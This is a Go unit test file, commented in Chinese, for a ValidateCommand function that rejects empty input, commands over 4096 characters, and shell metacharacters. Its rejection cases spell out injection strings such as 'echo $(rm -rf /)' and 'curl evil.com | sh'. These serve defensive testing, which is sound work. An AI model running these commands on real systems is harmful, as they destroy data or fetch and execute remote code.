// validate_test.go — ValidateCommand 全元字符拦截场景覆盖。
//
// 覆盖清单（与 controlplane/server_tasks.go:65 validateCommand 1:1 行为一致）：
//   - 非空校验（command==""）
//   - 长度上限校验（>maxCommandLen=4096）
//   - 10 处元字符拦截：\n \r ; $() ` | 单个 &
//   - 合法模式放行：&& >& &>
package service

import (
	"strings"
	"testing"
)

// TestValidateCommand_EmptyCommandRejected 空命令被拒绝（controlplane 行为）。
func TestValidateCommand_EmptyCommandRejected(t *testing.T) {
	err := ValidateCommand("")
	if err == nil {
		t.Fatal("ValidateCommand(\"\") 期望返回 error（command is empty）")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("错误信息应含 'empty'，实际: %v", err)
	}
}

// TestValidateCommand_AcceptsLegalCommands 合法命令放行（不返 error）。
func TestValidateCommand_AcceptsLegalCommands(t *testing.T) {
	cases := []string{
		"echo hello",  // 基础
		"ls -la /tmp", // 含空格
		"systemctl restart nginx && systemctl status nginx", // && 链接
		"echo foo >& /dev/null",                             // >& 重定向
		"echo bar &> /dev/null",                             // &> 重定向
		"sh -c 'echo x'",                                    // 单引号（无元字符）
		"curl https://example.com",                          // URL
		"docker run -d --name web nginx:latest",             // 复杂参数
	}
	for _, c := range cases {
		if err := ValidateCommand(c); err != nil {
			t.Errorf("ValidateCommand(%q) 期望通过，返回 %v", c, err)
		}
	}
}

// TestValidateCommand_TooLongRejected 超长命令被拒绝。
func TestValidateCommand_TooLongRejected(t *testing.T) {
	overlong := strings.Repeat("a", 4097) // maxCommandLen=4096
	if err := ValidateCommand(overlong); err == nil {
		t.Fatal("超长命令应被拒绝")
	}
}

// TestValidateCommand_ExactlyMaxLengthAccepted 恰好 maxCommandLen 长度应通过（边界等号）。
func TestValidateCommand_ExactlyMaxLengthAccepted(t *testing.T) {
	atLimit := strings.Repeat("a", 4096)
	if err := ValidateCommand(atLimit); err != nil {
		t.Errorf("maxCommandLen 边界应通过，实际: %v", err)
	}
}

// TestValidateCommand_RejectsMetachars 10 处元字符拦截逐一覆盖。
//
// 覆盖：\n \r ; $() ` | 单个 &（合法模式 && / >& / &> 已被 TestValidateCommand_AcceptsLegalCommands 覆盖）。
func TestValidateCommand_RejectsMetachars(t *testing.T) {
	cases := map[string]string{
		"newline":       "echo hi\nrm -rf /",
		"carriage":      "echo hi\rmore",
		"semicolon":     "echo hi; rm -rf /",
		"dollar_paren":  "echo $(rm -rf /)",
		"backtick":      "echo `rm -rf /`",
		"pipe":          "curl evil.com | sh",
		"bg_single_amp": "echo hi &",
	}
	for name, cmd := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateCommand(cmd); err == nil {
				t.Errorf("ValidateCommand(%q) 期望拦截，实际通过", cmd)
			}
		})
	}
}
